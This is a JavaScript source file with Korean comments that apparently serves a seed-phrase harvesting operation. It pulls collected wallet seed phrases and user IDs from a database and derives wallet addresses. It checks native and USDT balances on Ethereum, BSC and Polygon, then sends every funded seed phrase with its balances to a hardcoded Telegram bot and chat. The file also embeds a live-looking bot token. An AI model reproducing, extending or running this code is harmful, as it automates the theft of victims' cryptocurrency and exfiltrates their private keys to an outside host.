/**
 * 🔍 시드 문구 잔고 검수 시스템
 * 
 * 기능:
 * - DB에서 검수 안 된 시드 문구 조회
 * - 시드 문구로부터 지갑 주소 생성 및 잔고 확인
 * - 잔고가 0 이상이면 텔레그램 알림 (시드 문구 + 잔고)
 * - 검수 완료 처리
 */

const cron = require('node-cron');
const axios = require('axios');
const ethers = require('ethers');
const TronWeb = require('tronweb');
const db = require('./db');

// ========================================
// 🔧 설정
// ========================================

const CONFIG = {
  // 텔레그램 봇 설정
  TELEGRAM_BOT_TOKEN: '8549976717:AAH5_jqcGCHlmZgSBi4nJNxmyVCKQI8HboQ',
  TELEGRAM_CHAT_ID: '-1003732339035',
  
  // 스캔 주기 (기본: 30초마다)
  CRON_SCHEDULE: process.env.SEED_CRON_SCHEDULE || '*/30 * * * * *',
  
  // 한 번에 처리할 시드 개수
  BATCH_SIZE: 1,
  
  // RPC 엔드포인트 (무료 공개 RPC)
  RPC_URLS: {
    ethereum: 'https://rpc.flashbots.net',
    bsc: 'https://bsc-dataseed1.binance.org',
    polygon: 'https://polygon.drpc.org',
    // tron: 'https://api.trongrid.io',  // TronWeb 버전 호환성 문제로 임시 비활성화
  },
  
  // USDT 컨트랙트 주소
  USDT_CONTRACTS: {
    ethereum: '0xdAC17F958D2ee523a2206206994597C13D831ec7',  // ERC20 USDT
    bsc: '0x55d398326f99059fF775485246999027B3197955',      // BEP20 USDT
    polygon: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F',    // Polygon USDT (USDT.e)
    tron: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',            // TRC20 USDT
  },
  
  // 최소 알림 잔고 (ETH 기준)
  MIN_BALANCE: 0,
};

// ========================================
// 💾 처리 이력
// ========================================

const processedSeeds = new Set();

// ========================================
// 📨 텔레그램 전송 함수
// ========================================

async function sendTelegram(message) {
  try {
    const url = `https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`;
    const response = await axios.post(url, {
      chat_id: CONFIG.TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: 'HTML',
    });
    
    if (response.data.ok) {
      console.log('✅ 텔레그램 전송 성공');
      return true;
    } else {
      console.error('❌ 텔레그램 전송 실패:', response.data);
      return false;
    }
  } catch (error) {
    console.error('❌ 텔레그램 전송 오류:', error.message);
    return false;
  }
}

// ========================================
// 🔍 잔고 확인 함수
// ========================================

async function checkBalance(seedPhrase, network = 'ethereum') {
  try {
    // Tron은 별도 처리
    if (network === 'tron') {
      return await checkTronBalance(seedPhrase);
    }
    
    // 시드 문구로부터 지갑 생성
    const wallet = ethers.Wallet.fromPhrase(seedPhrase);
    const address = wallet.address;
    
    // RPC 프로바이더 생성 (타임아웃 설정)
    const provider = new ethers.JsonRpcProvider(CONFIG.RPC_URLS[network], null, {
      staticNetwork: true, // 네트워크 감지 스킵
      timeout: 10000, // 10초 타임아웃
    });
    
    // 네이티브 토큰 잔고 조회
    const balance = await provider.getBalance(address);
    const balanceInEth = ethers.formatEther(balance);
    
    // USDT 잔고 조회
    let usdtBalance = '0';
    try {
      const usdtContract = CONFIG.USDT_CONTRACTS[network];
      if (usdtContract) {
        const contract = new ethers.Contract(
          usdtContract,
          ['function balanceOf(address) view returns (uint256)'],
          provider
        );
        const usdtBal = await contract.balanceOf(address);
        // USDT는 대부분 6 decimals
        usdtBalance = ethers.formatUnits(usdtBal, 6);
      }
    } catch (error) {
      console.log(`⚠️  USDT 잔고 조회 실패 (${network}):`, error.message);
    }
    
    return {
      success: true,
      address,
      balance: balanceInEth,
      usdtBalance,
      network,
      wallet,
    };
  } catch (error) {
    console.error(`❌ ${network.toUpperCase()} 잔고 확인 오류: ${error.message}`);
    
    // RPC 연결 오류인 경우 더 자세한 정보 출력
    if (error.message.includes('network') || error.message.includes('timeout')) {
      console.error(`   RPC URL: ${CONFIG.RPC_URLS[network]}`);
      console.error(`   해결방법: RPC 엔드포인트를 확인하거나 다른 공개 RPC로 변경하세요.`);
    }
    
    return {
      success: false,
      network,
      error: error.message,
    };
  }
}

// ========================================
// 🔍 Tron 잔고 확인 (TronWeb 사용)
// ========================================

async function checkTronBalance(seedPhrase) {
  try {
    // 시드 문구로부터 개인키 생성
    const hdNode = ethers.HDNodeWallet.fromPhrase(seedPhrase);
    const privateKey = hdNode.privateKey.slice(2); // 0x 제거
    
    // TronWeb 인스턴스 생성
    const tronWeb = new TronWeb({
      fullHost: CONFIG.RPC_URLS.tron,
      privateKey: privateKey,
    });
    
    const address = tronWeb.defaultAddress.base58;
    
    // TRX 잔고 조회
    const balance = await tronWeb.trx.getBalance(address);
    const balanceInTrx = (balance / 1e6).toString(); // TRX는 6 decimals
    
    // USDT 잔고 조회 (TRC20)
    let usdtBalance = '0';
    try {
      const contract = await tronWeb.contract().at(CONFIG.USDT_CONTRACTS.tron);
      const usdtBal = await contract.balanceOf(address).call();
      usdtBalance = (usdtBal / 1e6).toString(); // USDT는 6 decimals
    } catch (error) {
      console.log(`⚠️  USDT 잔고 조회 실패 (tron):`, error.message);
    }
    
    return {
      success: true,
      address,
      balance: balanceInTrx,
      usdtBalance,
      network: 'tron',
    };
  } catch (error) {
    console.error(`❌ TRON 잔고 확인 오류: ${error.message}`);
    
    if (error.message.includes('network') || error.message.includes('timeout')) {
      console.error(`   RPC URL: ${CONFIG.RPC_URLS.tron}`);
      console.error(`   해결방법: Tron RPC 엔드포인트를 확인하세요.`);
    }
    
    return {
      success: false,
      network: 'tron',
      error: error.message,
    };
  }
}

// ========================================
// 🔍 멀티체인 잔고 확인
// ========================================

async function checkMultiChainBalance(seedPhrase) {
  const results = [];
  
  for (const [network, rpcUrl] of Object.entries(CONFIG.RPC_URLS)) {
    try {
      const result = await checkBalance(seedPhrase, network);
      
      if (result.success) {
        results.push({
          network,
          address: result.address,
          balance: result.balance,
          usdtBalance: result.usdtBalance || '0',
          hasBalance: parseFloat(result.balance) > CONFIG.MIN_BALANCE || parseFloat(result.usdtBalance || 0) > CONFIG.MIN_BALANCE,
        });
      }
    } catch (error) {
      console.error(`❌ ${network} 체크 실패:`, error.message);
    }
  }
  
  return results;
}

// ========================================
// 📝 시드 검수 처리 함수
// ========================================

async function processSeed(seedData) {
  const { id, user_id, phrase, created_at } = seedData;
  
  // 중복 처리 방지
  const uniqueKey = `${id}:${phrase}`;
  if (processedSeeds.has(uniqueKey)) {
    return;
  }
  
  console.log('');
  console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
  console.log(`🔍 시드 검수 시작`);
  console.log(`📋 ID: ${id} | 사용자: ${user_id}`);
  console.log(`📝 시드 문구: ${phrase.substring(0, 40)}...`);
  console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
  
  try {
    // 멀티체인 잔고 확인
    const balanceResults = await checkMultiChainBalance(phrase);
    
    // 각 체인별 잔고 로그 출력
    console.log('');
    console.log('💰 체인별 잔고 확인 결과:');
    console.log('');
    
    balanceResults.forEach(r => {
      const symbol = getTokenSymbol(r.network);
      const hasNative = parseFloat(r.balance) > 0;
      const hasUsdt = parseFloat(r.usdtBalance) > 0;
      
      console.log(`🌐 ${r.network.toUpperCase().padEnd(10)} | 주소: ${r.address}`);
      console.log(`   💵 ${symbol.padEnd(6)}: ${r.balance.padEnd(20)} ${hasNative ? '✅' : '⚪'}`);
      console.log(`   💵 USDT  : ${r.usdtBalance.padEnd(20)} ${hasUsdt ? '✅' : '⚪'}`);
      console.log('');
    });
    
    // 잔고가 있는 체인 찾기
    const chainsWithBalance = balanceResults.filter(r => r.hasBalance);
    
    // 최대 잔고를 가진 체인 찾기 (네이티브 토큰 기준)
    let maxBalance = 0;
    let maxUsdtBalance = 0;
    balanceResults.forEach(r => {
      const bal = parseFloat(r.balance);
      const usdt = parseFloat(r.usdtBalance);
      if (bal > maxBalance) maxBalance = bal;
      if (usdt > maxUsdtBalance) maxUsdtBalance = usdt;
    });
    
    // DB에 잔고 저장
    await saveBalanceToDB(id, maxBalance, maxUsdtBalance);
    
    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
    console.log(`📊 검수 결과 요약:`);
    console.log(`   최대 네이티브 잔고: ${maxBalance}`);
    console.log(`   최대 USDT 잔고: ${maxUsdtBalance}`);
    console.log(`   잔고 있는 체인: ${chainsWithBalance.length}개`);
    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
    console.log('');
    
    if (chainsWithBalance.length > 0) {
      // 잔고 발견!
      console.log(`🎉 잔고 발견! ID: ${id}, 체인: ${chainsWithBalance.length}개`);
      console.log('');
      
      // 텔레그램 메시지 작성
      let message = `🚨 <b>잔고 발견!</b>\n\n`;
      message += `👤 <b>사용자:</b> ${user_id}\n`;
      message += `🆔 <b>시드 ID:</b> ${id}\n`;
      message += `📅 <b>수신일:</b> ${new Date(created_at).toLocaleString('ko-KR')}\n\n`;
      
      chainsWithBalance.forEach(chain => {
        message += `━━━━━━━━━━━━━━━━━━\n`;
        message += `🌐 <b>${chain.network.toUpperCase()}</b>\n`;
        message += `💰 <b>잔고:</b> ${chain.balance} ${getTokenSymbol(chain.network)}\n`;
        if (parseFloat(chain.usdtBalance) > 0) {
          message += `💵 <b>USDT:</b> ${chain.usdtBalance} USDT\n`;
        }
        message += `🔑 <b>주소:</b> <code>${chain.address}</code>\n`;
      });
      
      message += `\n━━━━━━━━━━━━━━━━━━\n`;
      message += `📝 <b>시드 문구:</b>\n<code>${phrase}</code>\n`;
      message += `━━━━━━━━━━━━━━━━━━`;
      
      // 텔레그램 전송
      console.log('📨 텔레그램 알림 전송 중...');
      const sent = await sendTelegram(message);
      
      if (sent) {
        console.log('✅ 텔레그램 알림 전송 성공!');
        // 검수 완료 처리 (DB에 플래그 추가)
        await markAsChecked(id);
        processedSeeds.add(uniqueKey);
      } else {
        console.log('❌ 텔레그램 알림 전송 실패!');
      }
    } else {
      console.log(`📭 잔고 없음. ID: ${id}`);
      // 잔고가 없어도 검수 완료 처리
      await markAsChecked(id);
      processedSeeds.add(uniqueKey);
    }
    
    console.log('✅ 검수 완료!');
    console.log('');
  } catch (error) {
    console.error(`❌ 시드 처리 오류 (ID: ${id}):`, error.message);
    console.log('');
  }
}

// ========================================
// 🏷️ 토큰 심볼 반환
// ========================================

function getTokenSymbol(network) {
  const symbols = {
    ethereum: 'ETH',
    bsc: 'BNB',
    polygon: 'MATIC',
    tron: 'TRX',
  };
  return symbols[network] || network.toUpperCase();
}

// ========================================
// 💾 DB에 잔고 저장
// ========================================

async function saveBalanceToDB(seedId, balance, usdtBalance) {
  try {
    await db.pool.query(
      'UPDATE seeds SET balance = ?, usdt_balance = ? WHERE id = ?',
      [balance, usdtBalance, seedId]
    );
    console.log(`💾 잔고 저장: ID ${seedId}, Balance: ${balance}, USDT: ${usdtBalance}`);
  } catch (error) {
    console.error(`❌ 잔고 저장 실패 (ID: ${seedId}):`, error.message);
  }
}

// ========================================
// ✅ 검수 완료 처리
// ========================================

async function markAsChecked(seedId) {
  try {
    await db.pool.query(
      'UPDATE seeds SET checked = TRUE, checked_at = NOW() WHERE id = ?',
      [seedId]
    );
    console.log(`✅ 검수 완료 처리: ID ${seedId}`);
  } catch (error) {
    console.error(`❌ 검수 완료 처리 실패 (ID: ${seedId}):`, error.message);
  }
}

// ========================================
// 📂 DB에서 미검수 시드 조회
// ========================================

async function getUncheckedSeeds() {
  try {
    const [rows] = await db.pool.query(
      `SELECT id, user_id, phrase, created_at 
       FROM seeds 
       WHERE checked IS NULL OR checked = FALSE 
       ORDER BY created_at ASC 
       LIMIT ?`,
      [CONFIG.BATCH_SIZE]
    );
    return rows;
  } catch (error) {
    console.error('❌ DB 조회 오류:', error.message);
    return [];
  }
}

// ========================================
// 🔄 스케줄러 작업
// ========================================

async function runCheck() {
  try {
    // 미검수 시드 조회
    const seeds = await getUncheckedSeeds();
    
    if (seeds.length === 0) {
      console.log(`📭 미검수 시드 없음 (${new Date().toLocaleString('ko-KR')})`);
      return;
    }
    
    console.log(`🔍 ${seeds.length}개 시드 검수 시작...`);
    
    // 순차적으로 처리
    for (const seed of seeds) {
      await processSeed(seed);
      
      // API 레이트 리밋 방지 (1초 대기)
      await new Promise(resolve => setTimeout(resolve, 1000));
    }
    
    console.log(`✅ 검수 완료 (${seeds.length}개)`);
  } catch (error) {
    console.error('❌ 스케줄러 오류:', error.message);
  }
}

// ========================================
// 🗄️ DB 테이블 업데이트 (checked 컬럼 추가)
// ========================================

async function ensureCheckedColumn() {
  try {
    // checked 컬럼 존재 확인
    const [columns] = await db.pool.query(
      "SHOW COLUMNS FROM seeds LIKE 'checked'"
    );
    
    if (columns.length === 0) {
      // checked 컬럼 추가
      await db.pool.query(
        'ALTER TABLE seeds ADD COLUMN checked BOOLEAN DEFAULT FALSE'
      );
      await db.pool.query(
        'ALTER TABLE seeds ADD COLUMN checked_at DATETIME'
      );
      console.log('✅ seeds 테이블에 checked 컬럼 추가됨');
    } else {
      console.log('✅ seeds 테이블 스키마 확인 완료');
    }
  } catch (error) {
    console.error('❌ 테이블 스키마 업데이트 실패:', error.message);
    throw error;
  }
}

// ========================================
// 🚀 메인 실행
// ========================================

async function main() {
  console.log('');
  console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
  console.log('🔍 시드 문구 잔고 검수 시스템 시작');
  console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
  console.log(`📨 텔레그램 채팅: ${CONFIG.TELEGRAM_CHAT_ID}`);
  console.log(`⏱️  스케줄: ${CONFIG.CRON_SCHEDULE}`);
  console.log(`📦 배치 크기: ${CONFIG.BATCH_SIZE}개`);
  console.log(`💵 최소 잔고: ${CONFIG.MIN_BALANCE}`);
  console.log(`🌐 지원 체인: ${Object.keys(CONFIG.RPC_URLS).join(', ')}`);
  console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
  console.log('');
  
  // DB 연결 확인
  try {
    await db.seedDB.getAll();
    console.log('✅ MariaDB 연결 확인');
  } catch (error) {
    console.error('❌ MariaDB 연결 실패:', error.message);
    process.exit(1);
  }
  
  // 테이블 스키마 확인 및 업데이트
  await ensureCheckedColumn();
  
  // 텔레그램 테스트
  console.log('📨 텔레그램 연결 테스트 중...');
  const testResult = await sendTelegram('✅ 시드 문구 검수 시스템이 시작되었습니다!');
  
  if (!testResult) {
    console.error('❌ 텔레그램 연결 실패! 봇 토큰과 채팅 ID를 확인하세요.');
    process.exit(1);
  }
  
  console.log('');
  console.log('🎯 검수 시작... (Ctrl+C로 종료)');
  console.log('');
  
  // 즉시 첫 검수 실행
  await runCheck();
  
  // 스케줄러 시작
  cron.schedule(CONFIG.CRON_SCHEDULE, async () => {
    await runCheck();
  });
}

// ========================================
// 🎬 실행
// ========================================

if (require.main === module) {
  main().catch(error => {
    console.error('❌ 치명적 오류:', error);
    process.exit(1);
  });
}

module.exports = { checkBalance, checkMultiChainBalance, processSeed };

